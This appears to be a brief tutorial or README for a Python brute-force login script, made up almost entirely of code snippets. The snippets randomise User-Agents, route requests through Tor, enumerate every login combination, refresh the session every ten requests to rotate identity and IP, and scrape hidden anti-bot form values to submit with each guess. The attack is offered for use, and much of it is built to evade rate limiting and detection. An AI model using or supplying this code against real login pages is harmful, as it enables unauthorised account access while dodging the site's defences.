# Simple bruteforce script

Generate Random User-Agent
```
from fake_useragent import UserAgent
headers = {
    'User-Agent': UserAgent().random
}
```

Proxy (TOR proxy is used in example)
```
proxies = {
    "http": "socks5://127.0.0.1:9050",
    "https": "socks5://127.0.0.1:9050",
}
```

Use itertools module to enumerate all possible combinations of logins
```
for login in itertools.product(SYMBOLS, repeat=login_length):
    login = "".join(login)
```

Refresh the session per 10 requests, to change User-Agent and IP
```
def start_new_session():
    s = requests.Session()
    r = s.get(URL, headers=headers, proxies=proxies)
    return s, r

if counter == 10:
    session, response = start_new_session()
    counter = 0
```

To send request the application requires some data from the page source. Use BeautifulSoup library to parse the webpage
```
data = {
    'login': login,
    'password': login,
    'answer': soup.find(id="Answer_hidden")['value'],
    'hash': soup.find(id="hash_hidden")['value'],
    'one': soup.find(id="One_hidden")['value'],
    'symbol': soup.find(id="Symbol_hidden")['value'],
    'two': soup.find(id="Two_hidden")['value'],
    'type': soup.find(id="Type_hidden")['value']
}
```
